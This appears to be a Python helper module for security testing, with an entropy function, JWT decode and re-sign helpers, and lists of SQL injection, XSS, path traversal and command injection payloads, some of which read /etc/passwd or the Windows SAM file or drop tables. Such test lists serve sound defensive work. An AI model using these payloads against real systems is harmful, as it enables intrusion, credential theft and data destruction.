"""Shared utility functions for security testing."""

import math
import json
import base64
from collections import Counter
from typing import Optional, Dict, Any


def calculate_entropy(data: str) -> float:
    """Calculate Shannon entropy of a string."""
    if not data:
        return 0.0
    counter = Counter(data)
    length = len(data)
    entropy = 0.0
    for count in counter.values():
        p = count / length
        entropy -= p * math.log2(p)
    return entropy


def decode_jwt_unsafe(token: str) -> Optional[Dict[str, Any]]:
    """Decode a JWT token without verification (for inspection only)."""
    try:
        parts = token.split(".")
        if len(parts) != 3:
            return None
        # Decode header and payload
        def _pad_b64(s):
            return s + "=" * (4 - len(s) % 4)

        header = json.loads(base64.urlsafe_b64decode(_pad_b64(parts[0])))
        payload = json.loads(base64.urlsafe_b64decode(_pad_b64(parts[1])))
        return {"header": header, "payload": payload}
    except Exception:
        return None


def try_jwt_forge(token: str, secret_key: str) -> Optional[str]:
    """Try to decode and re-sign a JWT with the given secret key."""
    try:
        import jwt
        payload = jwt.decode(token, secret_key, algorithms=["HS256"])
        # If decode succeeds, the key is correct
        return jwt.encode(payload, secret_key, algorithm="HS256")
    except Exception:
        return None


SQL_INJECTION_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "'; DROP TABLE users --",
    "' UNION SELECT * FROM users --",
    "' UNION SELECT username, password_hash FROM users --",
    "' AND SLEEP(5) --",
    "admin'--",
    "1' OR '1'='1' #",
    "' ; SELECT * FROM users --",
    "1 UNION SELECT null,null,null --",
]

XSS_PAYLOADS = [
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '"><script>alert(1)</script>',
    "javascript:alert(1)",
    '<iframe src="javascript:alert(1)">',
    '<body onload=alert(1)>',
    "'-alert(1)-'",
    '<img src=x onerror="alert(document.cookie)">',
]

PATH_TRAVERSAL_PAYLOADS = [
    "../../etc/passwd",
    "..\\..\\windows\\system32\\config\\sam",
    "....//....//etc/passwd",
    "%2e%2e%2fetc%2fpasswd",
    "%252e%252e%252fetc%252fpasswd",
    "..%00/etc/passwd",
]

COMMAND_INJECTION_PAYLOADS = [
    "; cat /etc/passwd",
    "$(whoami)",
    "`whoami`",
    "| ls -la",
    "&& dir",
    "; ping -c 3 127.0.0.1",
]
